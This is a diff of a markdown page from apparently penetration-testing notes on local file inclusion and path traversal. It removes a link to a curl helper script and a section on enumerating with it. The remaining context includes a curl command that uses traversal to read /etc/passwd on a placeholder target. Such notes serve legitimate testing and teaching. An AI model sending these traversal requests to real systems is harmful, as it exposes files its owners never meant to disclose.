@@ -1,6 +1,6 @@
 # LFI / path traversal
 
-[← Foothold](../02-foothold.md) · [RFI](rfi.md) · [curl helper](../scripts/lfi-enum)
+[← Foothold](../02-foothold.md) · [RFI](rfi.md)
 
 ## Confirm
 
@@ -11,15 +11,6 @@ curl --path-as-is 'http://<target>/download/../../etc/passwd'  # if input is in 
 ```
 
 Compare with the missing-file response. Confirm with file content, not status or length alone. Errors may disclose the prepended directory or appended extension.
-
-## Enumerate with curl
-
-```bash
-./scripts/lfi-enum -u 'http://<target>/index.php?page=FUZZ'
-./scripts/lfi-enum -u 'http://<target>/index.php?page=FUZZ' -d 8 -w ./paths.txt -b ./cookies.txt
-```
-
-Tests absolute paths and `../` depths; saves every body plus a missing-file control per depth. `DIFF` in `results.tsv` is a lead to inspect, not a confirmed read.
 
 ## Files worth trying
 
